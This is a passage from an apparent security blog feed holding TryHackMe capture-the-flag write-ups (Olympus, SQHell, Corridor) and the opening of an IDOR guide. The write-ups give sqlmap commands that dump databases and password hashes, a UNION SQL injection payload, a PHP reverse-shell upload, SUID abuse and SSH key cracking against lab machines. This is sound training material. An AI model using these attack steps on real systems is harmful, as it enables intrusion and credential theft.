<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://olympus.thm/  -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/olympus/gobuster.png" alt="gobuster" /></p>

<p>Now, let’s navigate to the <code class="language-plaintext highlighter-rouge">/~webmaster</code> page and explore its contents.</p>

<p><img src="/assets/img/tryhackme/olympus/webmaster.png" alt="webmaster" /></p>

<p>On this page, we can see <code class="language-plaintext highlighter-rouge">posts shared by Root</code>, a <code class="language-plaintext highlighter-rouge">search</code> bar, a <code class="language-plaintext highlighter-rouge">login</code> bar, and several <code class="language-plaintext highlighter-rouge">categories</code>. There are several potential points on the page where <code class="language-plaintext highlighter-rouge">SQLi</code> can be attempted.</p>

<p>First, we’ll capture the a categories page request and save it using <code class="language-plaintext highlighter-rouge">BurpSuite</code> <code class="language-plaintext highlighter-rouge">(Right Click &gt; Save Item)</code>.</p>

<p><img src="/assets/img/tryhackme/olympus/request.png" alt="request" /></p>

<p>Then we’ll do a <code class="language-plaintext highlighter-rouge">sqlmap scan</code> on the captured request.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r ol.req --dbs
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/olympus/dbs.png" alt="dbs" /></p>

<p>We found the <code class="language-plaintext highlighter-rouge">olympus database</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r ol.req -D olympus --tables
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/olympus/tables.png" alt="tables" /></p>

<p>Let’s get the flag.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r ol.req -D olympus -T flag --dump
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/olympus/flag.png" alt="flag" /></p>

<p>Well done! We find the <code class="language-plaintext highlighter-rouge">first flag</code>.</p>

<p><br /></p>

<h3 id="what-is-flag-2">What is Flag 2?</h3>

<p>Now, let’s examine the <code class="language-plaintext highlighter-rouge">"users"</code> table.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r ol.req -D olympus -T users --dump
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/olympus/users.png" alt="users" /></p>

<p>We find <code class="language-plaintext highlighter-rouge">three users</code> and their corresponding <code class="language-plaintext highlighter-rouge">hashes</code>. Additionally, there is a <code class="language-plaintext highlighter-rouge">subdomain</code> mentioned: <code class="language-plaintext highlighter-rouge">chat.olympus.thm</code></p>

<p>First, let’s <code class="language-plaintext highlighter-rouge">crack these hashes</code>.</p>

<p><img src="/assets/img/tryhackme/olympus/crack.png" alt="crack" /></p>

<p>After cracking the hashes, we found <code class="language-plaintext highlighter-rouge">only Prometheus' password</code>.</p>

<p>Now, let’s return to the website and log in as Prometheus.</p>

<p><img src="/assets/img/tryhackme/olympus/admin.png" alt="admin" /></p>

<p>An <code class="language-plaintext highlighter-rouge">admin page</code> appears.  I tried uploading a <code class="language-plaintext highlighter-rouge">reverse shell</code>, but it didn’t work. The admin page does not seem to provide any useful information.</p>

<p>Let’s go to the <code class="language-plaintext highlighter-rouge">chat.olympus.thm</code> we found earlier.</p>

<p>To access it, we need to <code class="language-plaintext highlighter-rouge">add the subdomain</code> to the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</p>

<p><img src="/assets/img/tryhackme/olympus/etc-2.png" alt="etc-2" /></p>

<p>We are presented with a <code class="language-plaintext highlighter-rouge">login page</code>.</p>

<p><img src="/assets/img/tryhackme/olympus/login.png" alt="login" /></p>

<p>Let’s <code class="language-plaintext highlighter-rouge">login as Prometheus</code>.</p>

<p><img src="/assets/img/tryhackme/olympus/chat.png" alt="chat" /></p>

<p>An interesting chat application awaits us.</p>

<p><code class="language-plaintext highlighter-rouge">Zeus says</code> an interesting thing here. If we upload a file, the file name gets changed to a <code class="language-plaintext highlighter-rouge">random string</code>. However, let’s upload a <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">reverse shell</a>.</p>

<p><img src="/assets/img/tryhackme/olympus/shell.png" alt="shell" /></p>

<p>Now, let’s do a <code class="language-plaintext highlighter-rouge">gobuster</code> scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://chat.olympus.thm/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/olympus/gobuster-2.png" alt="gobuster-2" /></p>

<p>We navigate to the <code class="language-plaintext highlighter-rouge">"uploads"</code> directory, hoping to find the <code class="language-plaintext highlighter-rouge">shell.php</code> file we uploaded earlier.</p>

<p><img src="/assets/img/tryhackme/olympus/white.png" alt="white" /></p>

<p>Unfortunately, <code class="language-plaintext highlighter-rouge">there is nothing</code> of interest here.</p>

<p>Let’s go back to the Olympus database.</p>

<p><img src="/assets/img/tryhackme/olympus/tables-2.png" alt="tables-2" /></p>

<p>Let’s <code class="language-plaintext highlighter-rouge">dump the chats</code> table.</p>

<p><img src="/assets/img/tryhackme/olympus/chats.png" alt="chats" /></p>

<p>We found the <code class="language-plaintext highlighter-rouge">shell.php</code> file and the file name is changed. However, we need to set up a <code class="language-plaintext highlighter-rouge">netcat listener</code>. Then we can go <code class="language-plaintext highlighter-rouge">/uploads/filename</code>.</p>

<p><img src="/assets/img/tryhackme/olympus/url.png" alt="url" /></p>

<p>And we are in!</p>

<p><img src="/assets/img/tryhackme/olympus/in.png" alt="in" /></p>

<p>Let’s get the <code class="language-plaintext highlighter-rouge">flag 2</code>.</p>

<p><img src="/assets/img/tryhackme/olympus/flag-2.png" alt="flag-2" /></p>

<p><br /></p>

<h3 id="what-is-flag-3">What is Flag 3?</h3>

<p>Now, let’s examine the <code class="language-plaintext highlighter-rouge">zeus.txt</code> file.</p>

<p><img src="/assets/img/tryhackme/olympus/txt.png" alt="txt" /></p>

<p>It appears that Prometheus may have placed a <code class="language-plaintext highlighter-rouge">backdoor in Olympus</code>. And according to what he said, <code class="language-plaintext highlighter-rouge">he got root privileges</code> this way. We need to find this file but first, let’s explore the server.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ find / -type f -perm -04000 -ls 2&gt;/dev/null
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/olympus/find.png" alt="find" /></p>

<p>We found interesting things here. Unlike others, <code class="language-plaintext highlighter-rouge">Cputils</code> can be run with Zeus privileges.</p>

<p>Let’s run.</p>

<p><img src="/assets/img/tryhackme/olympus/cputils.png" alt="cputils" /></p>

<p>Let’s copy the <code class="language-plaintext highlighter-rouge">id_rsa</code> to our own machine.</p>

<p><img src="/assets/img/tryhackme/olympus/copy.png" alt="copy" /></p>

<p>Then, we use <code class="language-plaintext highlighter-rouge">ssh2john</code> to <code class="language-plaintext highlighter-rouge">crack the RSA key</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh2john zeus.rsa &gt; zeus.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt zeus.hash
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/olympus/ssh2.png" alt="ssh2" /></p>

<p>Now, we can access <code class="language-plaintext highlighter-rouge">Zeus with ssh</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ chmod 600 zeus.rsa
$ ssh -i zeus.rsa zeus@10.10.35.164
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/olympus/ssh-zeus.png" alt="ssh-zeus" /></p>

<p>Now that we know Prometheus uploaded a backdoor. So I searched a lot and I found the file.  It is an <code class="language-plaintext highlighter-rouge">interesting file</code> located in the <code class="language-plaintext highlighter-rouge">/var/www/html/</code> directory.</p>

<p><img src="/assets/img/tryhackme/olympus/var.png" alt="var" /></p>

<p>Let’s look at the <code class="language-plaintext highlighter-rouge">VIGQFQFMYOST.php</code> file and what’s in it.</p>

<p><img src="/assets/img/tryhackme/olympus/phfile.png" alt="phfile" /></p>

<p>There is <code class="language-plaintext highlighter-rouge">password information</code>. More importantly, we can have root privileges with this file, so I think <code class="language-plaintext highlighter-rouge">suid_bd</code> is more interesting. Let’s try.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ uname -a; w; /lib/defended/libc.so.99
</code></pre></div></div>
<p><img src="/assets/img/tryhackme/olympus/root.png" alt="root" /></p>

<p>Success! We now have <code class="language-plaintext highlighter-rouge">root access</code>.</p>

<p>Let’s get the <code class="language-plaintext highlighter-rouge">root flag</code> from the <code class="language-plaintext highlighter-rouge">root directory</code>.</p>

<p><img src="/assets/img/tryhackme/olympus/root-flag.png" alt="root-flag" /></p>

<p><br /></p>

<h3 id="what-is-flag-4">What is Flag 4?</h3>

<p><strong><code class="language-plaintext highlighter-rouge">Hint: The flag is located in /etc/</code></strong></p>

<p>According to <code class="language-plaintext highlighter-rouge">hint</code>, the last flag is <code class="language-plaintext highlighter-rouge">located in /etc</code>. We can search for it using <code class="language-plaintext highlighter-rouge">grep</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ grep -r flag /etc
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/olympus/last-flag.png" alt="last-flag" /></p>

<p><code class="language-plaintext highlighter-rouge">Success!</code> We found <code class="language-plaintext highlighter-rouge">bonus flag</code>.</p>

<p><br /></p>

<p><code class="language-plaintext highlighter-rouge">Congratulations!</code> We have successfully completed the steps to find all the flags. It was nice CTF. I hope you learned something and had fun. But that’s it for now till next time take care :wave:</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="vhost, upload, sqli, enumeration" /><summary type="html"><![CDATA[Hey!]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/olympus.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/olympus.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - SQHell</title><link href="http://localhost:4000/tryhackme-sqhell/" rel="alternate" type="text/html" title="TryHackMe - SQHell" /><published>2023-07-06T00:00:00+03:00</published><updated>2023-07-06T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-sqhell</id><content type="html" xml:base="http://localhost:4000/tryhackme-sqhell/"><![CDATA[<p>Try and find all the flags in the SQL Injections.</p>

<p>Give the machine a minute to boot and then connect to http://MACHINE_IP</p>

<p>There are 5 flags to find but you have to defeat the different SQL injection types.</p>

<p>Hint: Unless displayed on the page the flags are stored in the flag table in the flag column.</p>

<p><br /></p>

<h3 id="flag-1">Flag 1</h3>

<p>Let’s do a <code class="language-plaintext highlighter-rouge">Nmap</code> scan to gather information about the target.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.60.81
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/sqhell/nmap.png" alt="nmap" /></p>

<p>As we see <code class="language-plaintext highlighter-rouge">22/tcp and 80/tcp</code> ports are open.</p>

<p>Let’s <code class="language-plaintext highlighter-rouge">explore the website</code> accessible through the HTTP port.</p>

<p>We can see, <code class="language-plaintext highlighter-rouge">two posts shared by the admin</code> on the website.</p>

<p>And looks like three pages on the homepage. These are the <code class="language-plaintext highlighter-rouge">Terms &amp; Conditions page</code>, a <code class="language-plaintext highlighter-rouge">login</code>, and a <code class="language-plaintext highlighter-rouge">register</code> page.</p>

<p><img src="/assets/img/tryhackme/sqhell/home.png" alt="home" /></p>

<p>Let’s click on the admin and see what’s in there.</p>

<p><img src="/assets/img/tryhackme/sqhell/admin.png" alt="admin" /></p>

<p>We can see the admin’s ID. And the admin’s two posts.</p>

<p>Let’s go to the <code class="language-plaintext highlighter-rouge">login page and try bypassing</code>.</p>

<p><img src="/assets/img/tryhackme/sqhell/login.png" alt="login" /></p>

<p>First, we’ll capture the login page request using BurpSuite and <code class="language-plaintext highlighter-rouge">forward it to Intruder</code>.</p>

<p><img src="/assets/img/tryhackme/sqhell/intruder.png" alt="intruder" /></p>

<p>After that, we’ll copy the <a href="https://github.com/payloadbox/sql-injection-payload-list#sql-injection-auth-bypass-payloads">payload</a> list and paste it into BurpSuite.</p>

<p><img src="/assets/img/tryhackme/sqhell/payload.png" alt="payload" /></p>

<p>Now let’s start an attack and see the results.</p>

<p><img src="/assets/img/tryhackme/sqhell/flag-1.png" alt="flag-1" /></p>

<p>Success! We found the <code class="language-plaintext highlighter-rouge">first flag</code>.</p>

<p><br /></p>

<h3 id="flag-2">Flag 2</h3>

<p><strong><code class="language-plaintext highlighter-rouge">Hint: Make sure to read the terms and conditions ;)</code></strong></p>

<p>Let’s check the <code class="language-plaintext highlighter-rouge">terms and conditions</code> page.</p>

<p><img src="/assets/img/tryhackme/sqhell/term.png" alt="term" /></p>

<p>An interesting condition is mentioned here.</p>

<p><strong><code class="language-plaintext highlighter-rouge">iii: We log your IP address for analytics purposes</code></strong></p>

<p>We can derive the following from this. This website may be performing <code class="language-plaintext highlighter-rouge">IP-based security</code> checks or access controls. This can be done using <code class="language-plaintext highlighter-rouge">X-Forwarded-For</code>.</p>

<p><code class="language-plaintext highlighter-rouge">X-Forwarded-For</code> is used to preserve the real IP address of the client while passing the HTTP request between servers. If intermediate servers like proxy servers or load balancers are used, the actual client IP address can be lost, and the IP addresses of these intermediate servers are passed to the server. The <code class="language-plaintext highlighter-rouge">X-Forwarded-For header is used to fix this situation</code>. Intermediate servers can forward the real client IP address by adding it to the X-Forwarded-For header. In this way, the server can identify the correct IP address by reading the real client’s IP address from the X-Forwarded-For header. However, these <code class="language-plaintext highlighter-rouge">headers can be manipulated, and fake IP addresses can be added</code>.</p>

<p>To manipulate the X-Forwarded-For header for this purpose, we will use the <code class="language-plaintext highlighter-rouge">"--headers='X-forwarded-for:1*'"</code>parameter in sqlmap.</p>

<p>The <code class="language-plaintext highlighter-rouge">"--headers='X-forwarded-for:1*'"</code> parameter allows the sqlmap tool to automatically perform this manipulation. By adding the expression <code class="language-plaintext highlighter-rouge">"1*"</code> to the header, the beginning of an IP address is specified as the header value. This is used to try different scenarios when attempting to bypass IP-based controls or restrictions in a web application.</p>

<p>Let’s do the attack.</p>

<p><img src="/assets/img/tryhackme/sqhell/sqlmap.png" alt="sqlmap" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap --dbms mysql --headers="X-forwarded-for:1*" -u http://10.10.60.81/

</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">Great!</code> We found a <code class="language-plaintext highlighter-rouge">Time-Based Blind SQLi</code> vulnerability.</p>

<p><img src="/assets/img/tryhackme/sqhell/time.png" alt="time" /></p>

<p>Let’s get the <code class="language-plaintext highlighter-rouge">Flag-2</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap --dbms mysql --headers="X-forwarded-for:1*" -u http://10.10.60.81/ -D sqhell_1 --dump
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/sqhell/flag-2.png" alt="flag-2" /></p>

<p><br /></p>

<h3 id="flag-3">Flag 3</h3>

<p>Let’s go to the <code class="language-plaintext highlighter-rouge">register page</code>.</p>

<p><img src="/assets/img/tryhackme/sqhell/register.png" alt="register" /></p>

<p>Capture the request and save it using BurpSuite <code class="language-plaintext highlighter-rouge">(Right Click &gt; Save Item)</code>.</p>

<p><img src="/assets/img/tryhackme/sqhell/cap-reg.png" alt="cap-reg" /></p>

<p>Perform a sqlmap scan on the captured request.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r test6.req -D sqhell_3 -T flag --dump
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/sqhell/flag-3.png" alt="flag-3" /></p>

<p>We found <code class="language-plaintext highlighter-rouge">Flag-3</code>.</p>

<p><br /></p>

<h3 id="flag-4">Flag 4</h3>

<p><strong><code class="language-plaintext highlighter-rouge">Hint: Well, dreams, they feel real while we're in them right?</code></strong></p>

<p>Now, let’s return to the <code class="language-plaintext highlighter-rouge">user page</code>. You can see the URL <code class="language-plaintext highlighter-rouge">endpoint is /user?id=1</code>.</p>

<p><img src="/assets/img/tryhackme/sqhell/user.png" alt="user" /></p>

<p>So, I try <code class="language-plaintext highlighter-rouge">id=2-1</code> for the <code class="language-plaintext highlighter-rouge">vulnerability detection</code>. And it’s <code class="language-plaintext highlighter-rouge">working</code>.</p>

<p><img src="/assets/img/tryhackme/sqhell/detect.png" alt="detect" /></p>

<p>So, let’s <code class="language-plaintext highlighter-rouge">capture the request</code> and <code class="language-plaintext highlighter-rouge">scan it using sqlmap</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r test5.req --dbs   
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/sqhell/sqhell-4.png" alt="sqhell-4" /></p>

<p>We found the <code class="language-plaintext highlighter-rouge">sqhell_4 table</code> but the flag is <code class="language-plaintext highlighter-rouge">not in there</code>. Let’s try the <code class="language-plaintext highlighter-rouge">UNION payload</code> on the website.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> /user?id=-1 UNION ALL SELECT "1 UNION SELECT 1,flag,3,4 FROM flag-- -", 1,2 FROM users#
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/sqhell/flag-4.png" alt="flag-4" /></p>

<p><code class="language-plaintext highlighter-rouge">Success!</code> We found <code class="language-plaintext highlighter-rouge">Flag-4</code>.</p>

<p><br /></p>

<h3 id="flag-5">Flag 5</h3>

<p>Now, only the <code class="language-plaintext highlighter-rouge">post page</code> that we didn’t look at.</p>

<p><img src="/assets/img/tryhackme/sqhell/post.png" alt="post" /></p>

<p>As we see the <code class="language-plaintext highlighter-rouge">endpoint is /post?id=1</code>.</p>

<p>Now, let’s capture the request and <code class="language-plaintext highlighter-rouge">scan with sqlmap</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r one.req -D sqhell_5 -T flag --dump
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/sqhell/flag-5.png" alt="flag-5" /></p>

<p>This one is easy. We found the <code class="language-plaintext highlighter-rouge">last flag</code>.</p>

<p><br /></p>

<p><code class="language-plaintext highlighter-rouge">Congratulations!</code> We have successfully completed the steps to find all the flags. It was nice CTF. I hope you learned something and had fun. But that’s it for now till next time take care :wave:</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="web, mysql, sqli" /><summary type="html"><![CDATA[Try and find all the flags in the SQL Injections.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/sqhell.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/sqhell.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Corridor</title><link href="http://localhost:4000/tryhackme-corridor/" rel="alternate" type="text/html" title="TryHackMe - Corridor" /><published>2023-07-05T00:00:00+03:00</published><updated>2023-07-05T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-corridor</id><content type="html" xml:base="http://localhost:4000/tryhackme-corridor/"><![CDATA[<p>Can you escape the Corridor?</p>

<p>You have found yourself in a strange corridor. Can you find your way back to where you came?</p>

<p>In this challenge, you will explore potential IDOR vulnerabilities. Examine the URL endpoints you access as you navigate the website and note the hexadecimal values you find (they look an awful lot like a hash, don’t they?). This could help you uncover website locations you were not expected to access.</p>

<p><br /></p>

<h3 id="1-what-is-the-flag">1. What is the flag?</h3>

<p>Let’s do a <code class="language-plaintext highlighter-rouge">Nmap</code> scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.186.148
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/corridor/nmap.png" alt="nmap" /></p>

<p>As we see <code class="language-plaintext highlighter-rouge">80/tcp</code> port is open.</p>

<p>Let’s visit that port. And there it is a homepage.</p>

<p><img src="/assets/img/tryhackme/corridor/home.png" alt="home" /></p>

<p>There’s not much we can do on the main page.</p>

<p>So, let’s check the <code class="language-plaintext highlighter-rouge">source page</code>.</p>

<p><img src="/assets/img/tryhackme/corridor/source.png" alt="source" /></p>

<p><code class="language-plaintext highlighter-rouge">Interesting!</code> As you can see, there is a lot of hash in here. 
But we don’t know what kind of hash these are. So let’s use the <code class="language-plaintext highlighter-rouge">hash-identifier</code> tool.</p>

<p><img src="/assets/img/tryhackme/corridor/hash-id.png" alt="hash-id" /></p>

<p>These hashes are encrypted with the <code class="language-plaintext highlighter-rouge">MD5</code> algorithm.</p>

<p>Let’s crack all of them.</p>

<p><img src="/assets/img/tryhackme/corridor/crack.png" alt="crack" /></p>

<p>The <code class="language-plaintext highlighter-rouge">first hash is 1</code>.  I kept cracking. And the <code class="language-plaintext highlighter-rouge">hashes go up to 13</code>.</p>

<p><img src="/assets/img/tryhackme/corridor/13.png" alt="13" /></p>

<p>These hashes are pages. We can <code class="language-plaintext highlighter-rouge">copy a hash and paste</code> the endpoint of the URL.</p>

<p>Now, we can go to the page. Like this:</p>

<p><img src="/assets/img/tryhackme/corridor/first.png" alt="first" /></p>

<p>So, these <code class="language-plaintext highlighter-rouge">hashes equals a number</code>.</p>

<p>Let’s try <code class="language-plaintext highlighter-rouge">encrypting the number 0 using MD5</code>.</p>

<p><img src="/assets/img/tryhackme/corridor/md5.png" alt="md5" /></p>

<p>Now, we have a hash. Let’s <code class="language-plaintext highlighter-rouge">insert this hash</code> into the URL.</p>

<p><img src="/assets/img/tryhackme/corridor/zero.png" alt="zero" /></p>

<p><code class="language-plaintext highlighter-rouge">Success!</code> We have found the flag.</p>

<p><br /></p>

<p>It was nice CTF. I hope you learned something and had fun. But that’s it for now till next time take care :wave:</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="security, idor, web" /><summary type="html"><![CDATA[Can you escape the Corridor?]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/corridor.png" /><media:content medium="image" url="http://localhost:4000/assets/img/corridor.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Insecure Direct Object References (IDOR) Guide</title><link href="http://localhost:4000/insecure-direct-object-references-idor-guide/" rel="alternate" type="text/html" title="Insecure Direct Object References (IDOR) Guide" /><published>2023-06-30T00:00:00+03:00</published><updated>2023-06-30T00:00:00+03:00</updated><id>http://localhost:4000/insecure-direct-object-references-idor-guide</id><content type="html" xml:base="http://localhost:4000/insecure-direct-object-references-idor-guide/"><![CDATA[<p>In this article, I will provide an explanation of  <code class="language-plaintext highlighter-rouge">Insecure Direct Object References (IDOR)</code> to the best of my ability.</p>

<p>I shared many <a href="#sources">resources</a> and <a href="#labs">labs</a> in this article, check them out.</p>

<p>I hope you find this article useful.</p>

<h3 id="topics">Topics</h3>

<ul>
  <li><a href="#idor">IDOR</a> <br /></li>
  <li><a href="#sources">IDOR Sources</a> <br /></li>
  <li><a href="#labs">IDOR Labs</a> <br /></li>
</ul>

<p><br /></p>

<p><img src="/assets/video/idor-guide/idor.png" alt="sqli" /></p>

<h3 id="idor">What is an IDOR?</h3>
<p>An <code class="language-plaintext highlighter-rouge">Insecure Direct Object Reference (IDOR)</code> is a vulnerability that enables unauthorized access and the execution of actions on a targeted web application by an attacker.</p>

<p>Web applications often include <code class="language-plaintext highlighter-rouge">functions</code> that users can perform within their accounts, such as profile editing. However, to <code class="language-plaintext highlighter-rouge">prevent IDOR vulnerabilities</code>, proper <code class="language-plaintext highlighter-rouge">authorization checks</code> should be implemented for these functions. For instance, when a user with an <code class="language-plaintext highlighter-rouge">ID of 10</code> attempts to use the profile editing function, the web application should verify if this <code class="language-plaintext highlighter-rouge">action belongs to the user</code> with ID 10. <code class="language-plaintext highlighter-rouge">IF NOT</code>, the user may be able to <code class="language-plaintext highlighter-rouge">manipulate different IDs</code>, gaining unauthorized access to and editing profiles of other users. This is an example of an <code class="language-plaintext highlighter-rouge">IDOR</code>.</p>

<p>IDOR is a <code class="language-plaintext highlighter-rouge">dangerous and critical</code> vulnerability. Although a common vulnerability, it can be <code class="language-plaintext highlighter-rouge">much more complex and hard to detect</code>. The reason for this web applications get more complex as they grow. These complications lead to increased vulnerability. And because of these complications, it is difficult to detect the vulnerability.</p>

<p>Let’s continue with an example from <code class="language-plaintext highlighter-rouge">Web Security Academy</code>.</p>

<p><br /></p>

<video width="640" height="360" controls="">
  <source src="/assets/video/idor-guide/IDOR.mp4" type="video/mp4" />
</video>

<p><br /></p>

<h3 id="sources">IDOR Sources</h3>

<ul>
  <li><a href="https://www.youtube.com/watch?v=rloqMGcPMkI">PwnFuction (Video) - Insecure Direct Object Reference (IDOR) Explained</a></li>
  <li><a href="https://www.youtube.com/watch?v=gINAtzdccts">InsiderPhD (Video) - Finding Your First Bug: Manual IDOR Hunting)</a></li>
  <li><a href="https://www.youtube.com/watch?v=3K1-a7dnA60&amp;t=260s">STÖK (Video) - Burp Suite tutorial: IDOR vulnerability automation using Autorize and AutoRepeater (bug bounty)</a></li>
  <li><a href="https://youtu.be/TsJ2XPuGe1k">Mehmet D.INCE (Video) - Web Security 101 0x02, IDOR Insecure Direct Object Reference Zafiyetleri Hakkında Her şey</a></li>
  <li><a href="https://portswigger.net/web-security/access-control/idor">Web Security Academy - IDOR</a></li>
  <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References">OWASP - IDOR</a></li>
  <li><a href="https://blog.intigriti.com/hackademy/idor/">Intigriti - IDOR</a></li>
  <li><a href="https://www.bugcrowd.com/blog/how-to-find-idor-insecure-direct-object-reference-vulnerabilities-for-large-bounty-rewards/">Bugcrowd - How-To: Find IDOR Vulnerabilities for Large Bounty Rewards</a></li>
  <li><a href="https://medium.com/@aysebilgegunduz/everything-you-need-to-know-about-idor-insecure-direct-object-references-375f83e03a87">Ayşe Bilgi Gündüz - Everything You Need to Know About IDOR</a></li>
  <li><a href="https://www.geeksforgeeks.org/insecure-direct-object-reference-idor-vulnerability/?ref=gcse">Geeksforgeeks - IDOR</a></li>
  <li><a href="https://book.hacktricks.xyz/pentesting-web/idor">HackTricks - IDOR</a></li>
  <li><a href="https://www.secjuice.com/idor-insecure-direct-object-reference-definition/">Secjuice - IDOR </a></li>
  <li><a href="https://thehackerish.com/idor-tutorial-hands-on-owasp-top-10-training/">Thehackerish - IDOR Tutorial</a></li>
  <li><a href="https://medium.com/cyberverse/automating-burp-to-find-idors-2b3dbe9fa0b8">Aditya Soni - Automating BURP to find IDORs</a></li>
  <li><a href="https://cyberweapons.medium.com/idor-is-everywhere-you-need-to-find-them-3ed12435c9de">ProfessorXSS - IDOR is Everywhere 😁 You need to find them</a></li>
  <li><a href="https://medium.com/@gonzalocarrascosec/fuzzing-idor-admin-takeover-5343bb8f436e">Gonzalo Carrasco - Fuzzing + IDOR = Admin TakeOver</a></li>
  <li><a href="https://infosecwriteups.com/all-about-getting-first-bounty-with-idor-849db2828c8">Mukul Trivedi (M0hn1sh) - All About Getting First Bounty with IDOR</a></li>
  <li><a href="https://medium.com/@swapmaurya20/a-simple-idor-to-account-takeover-88b8a1d2ec24">Swapmaurya - A Simple IDOR to Account Takeover</a></li>
  <li><a href="https://aseem-shrey.medium.com/attention-to-details-a-curious-case-of-multiple-idors-5a4417ba8848">Aseem Shrey - Attention to Details : Finding Hidden IDORs</a></li>
  <li><a href="https://vickieli.medium.com/intro-to-idor-9048453a3e5d">Vickie Li - Intro to IDOR</a></li>
  <li><a href="https://betterprogramming.pub/all-about-idor-attacks-64c4203b518e">Vickie Li - All About IDOR Attacks</a></li>
  <li><a href="https://vickieli.medium.com/how-to-find-more-idors-ae2db67c9489">Vickie Li - How to find more IDORs</a></li>
  <li><a href="https://sagarsajeev.medium.com/business-logic-vulnerability-via-idor-6d510f1caea9">Sagar Sajeev - Business Logic Vulnerability via IDOR</a></li>
  <li><a href="https://shahjerry33.medium.com/idor-inside-the-session-storage-88af485fc899">Jerry Shah (Jerry) - IDOR - Inside the Session Storage</a></li>
  <li><a href="https://medium.com/techiepedia/an-bug-bounty-hunters-guide-to-idor-vulnerabilities-27012bbccd7">Daniel Hunt - A Bug Bounty Hunter’s Guide to IDOR Vulnerabilities</a></li>
  <li><a href="https://thegrayarea.tech/bug-hunting-101-idors-for-beginners-40a43f7055ea">Graham Zemel - Bug Hunting 101: IDORs for Beginners</a></li>
  <li><a href="https://junoonbro.medium.com/idors-how-to-find-idors-in-ecommerce-sites-d112bd946fcf">JunoonBro - \(\) IDOR’s — How to find IDORs in Ecommerce sites?</a></li>
  <li><a href="https://medium.com/@swapmaurya20/3-step-idor-in-hackerresume-a365f2632996">Swapmaurya - 3 Step IDOR in HackerResume</a></li>
  <li><a href="https://infosecwriteups.com/what-is-idor-vulnerability-and-how-does-it-affect-you-85431d10f8fb">c0d3x27 - What is IDOR Vulnerability, and how does it affect you?</a></li>
  <li><a href="https://thexssrat.medium.com/idors-what-are-they-and-how-do-you-test-for-them-885c9df4af36">Thexssrat - IDORs: What are they and how do you test for them?</a></li>
  <li><a href="https://ms-official5878.medium.com/insecure-direct-object-reference-6cbe6dc2f47e">Mohammad Mohsin - Insecure Direct object Reference</a></li>
